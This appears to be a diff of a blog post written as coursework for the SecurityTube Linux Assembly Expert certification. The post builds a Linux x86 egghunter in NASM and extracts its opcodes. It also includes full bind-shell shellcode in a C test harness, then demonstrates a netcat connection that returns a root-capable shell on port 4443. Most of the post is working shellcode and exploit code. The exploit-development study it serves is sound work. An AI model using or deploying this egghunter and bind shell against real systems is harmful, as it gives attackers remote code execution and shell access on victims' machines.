@@ -86,17 +86,80 @@ page_size:
 
  or cx, 0xfff     ;or with 4095
  ```
-We ```or``` with 4095 instead of directly storing 4096 so that we can avoid a ```NULL```. Hence, ```or``` with 4095 and increment by 1.
+We ```or``` with 4095 instead of directly storing 4096 so that we can avoid a ```NULL```. Hence, we ```or``` with 4095 and increment by 1.
 
 Now, let's write a piece of code that checks for the ```EFAULT``` flag, and changes memory regions if that flag is returned:
 ```nasm
  efault_check:
 
-	xor eax, eax    ;clearing eax
+	xor eax, eax         ;clearing eax
 	inc ecx
-	mov al, 0x43    ;67 --> sigaction
-	int 0x80        ;syscall
+	mov al, 0x43         ;67 --> sigaction
+	int 0x80             ;syscall
 
-	cmp al, 0xf2    ;compare the flag returned to EFAULT
-	jz page_size    ;If it matches, set page alignment again and search through next region
+	cmp al, 0xf2         ;compare the flag returned to EFAULT
+	jz page_size         ;If it matches, set page alignment again and search through next region
 ```
+Now let's write the egghunter part of our shellcode:
+```nasm
+egghunter:
+
+	mov eax, 0xdeadbeef  ;our egg
+	mov edi, ecx         ;pointer to memory region
+	scasd                ;compare first 4 bytes stored in eax with edi (first egg)
+	jnz efault_check     ;if they dont match, continue looking
+	scasd                ;compare last 4 bytes stored in eax with edi (second egg)
+	jnz efault_check     ;if they dont match, continue looking
+	jmp edi              ;if all bytes match, jump to location and execute
+```
+Remember we prepend our shellcode with the egg twice. This part of the code checks for that.
+
+Now, we will need to write some c code, which includes both our shellcode and our egghunter. Before that. let's extract our egghunter's shellcode:
+```
+$ objdump -d ./egghunter|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x66\x81\xc9\xff\x0f\x31\xc0\x41\xb0\x43\xcd\x80\x3c\xf2\x74\xf0\xb8\xef\xbe\xad\xde\x89\xcf\xaf\x75\xeb\xaf\x75\xe8\xff\xe7"
+```
+Let's paste this in our c code, where the egghunter should go. For our original shellcode, I will be using our previously written bind shell shellcode:
+```c
+#include<stdio.h>
+#include<string.h>
+
+#define EGG "\xef\xbe\xad\xde"
+
+unsigned char egghunter[] = \
+"\x66\x81\xc9\xff\x0f\x31\xc0\x41\xb0\x43\xcd\x80\x3c\xf2\x74\xf0\xb8\xef\xbe\xad\xde\x89\xcf\xaf\x75\xeb\xaf\x75\xe8\xff\xe7";
+unsigned char code[]= \
+EGG
+EGG
+"\x31\xc0\x31\xdb\x31\xc9\x99\x6a\x66\x58\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66\x68\x11\x5b\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc9\x51\x6a\x0b\x58\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";
+
+main()
+{
+
+	printf("Length of Egg Hunter Shellcode:  %d\n", strlen(egghunter));
+	printf("Shellcode length: %d\n", strlen(code));
+	int (*ret)()=(int (*)())egghunter;
+	ret();
+}
+```
+Alright! let's test this out:
+```
+Terminal 1:
+$ gcc -fno-stack-protector -z execstack shellcode_egghunter.c -o shellcode_egghunter
+$ ./shellcode_egghunter
+Length of Egg Hunter Shellcode:  31
+Shellcode length: 110
+
+Terminal 2:
+$ nc -nv 127.0.0.1 4443
+(UNKNOWN) [127.0.0.1] 4443 (?) open
+uname -a
+Linux kali 5.4.0-kali3-686-pae #1 SMP Debian 5.4.13-1kali1 (2020-01-20) i686 GNU/Linux
+```
+It works! Our egghunter shellcode successfully locates our shellcode in memory and passes execution to it!
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.
+
+http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
+
+Student ID: SLAE - 1534
